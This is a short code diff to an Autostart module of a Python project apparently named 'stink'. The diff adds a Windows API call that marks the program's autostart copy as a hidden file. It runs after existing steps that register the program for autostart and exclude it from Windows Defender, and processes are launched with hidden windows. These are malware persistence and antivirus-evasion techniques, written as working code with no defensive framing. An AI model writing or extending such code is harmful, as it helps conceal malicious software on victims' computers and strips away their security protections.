@@ -1,5 +1,6 @@
 from os import path
 from shutil import copyfile
+from ctypes import windll
 from subprocess import Popen, CREATE_NEW_CONSOLE, SW_HIDE
 
 from stink.helpers.config import AutostartConfig
@@ -43,6 +44,18 @@ class Autostart:
             creationflags=CREATE_NEW_CONSOLE | SW_HIDE
         )
 
+    def __hide_file(self) -> None:
+        """
+        Makes a file hidden.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        """
+        windll.kernel32.SetFileAttributesW(self.__autostart_path, 2)
+
     def run(self) -> None:
         """
         Launches the autostart module.
@@ -57,6 +70,7 @@ class Autostart:
 
             self.__add_to_autostart()
             self.__exclude_from_defender()
+            self.__hide_file()
 
         except Exception as e:
             print(f"[Autostart]: {repr(e)}")
